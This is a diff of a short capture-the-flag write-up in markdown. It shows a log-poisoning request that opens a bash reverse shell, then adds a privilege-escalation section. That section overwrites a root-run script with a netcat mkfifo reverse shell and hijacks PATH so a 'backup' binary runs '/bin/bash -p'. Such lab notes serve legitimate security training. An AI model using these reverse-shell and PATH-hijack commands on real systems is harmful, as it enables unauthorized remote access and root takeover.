@@ -42,3 +42,32 @@ nmap/*
     ```
     /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=bash+-c+"exec+bash+-i+%26>/dev/tcp/10.9.26.67/1234+<%261" 
     ```
+
+#### TASK 3
+- Root Priviliege
+```
+1. interesting : /opt/helloworld.sh
+2. OverWriting Payload : User Escalating
+echo “rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc MY_IP 4444 > /tmp/f” > helloworld.sh
+
+[IN MY CASE]
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.26.67 4444 > /tmp/f" > /opt/helloworld.sh
+
+3. Root Escalating
+- cd ~/secret
+  -  interseting : backup
+
+- Process
+cd ~/secret
+ls -la
+./backup
+cd /tmp
+echo '/bin/bash -p' > cp
+chmod 777 cp
+ls -la | grep cp
+export PATH=/tmp:$PATH
+echo $PATH
+cd ~/secret
+./backup
+```
+
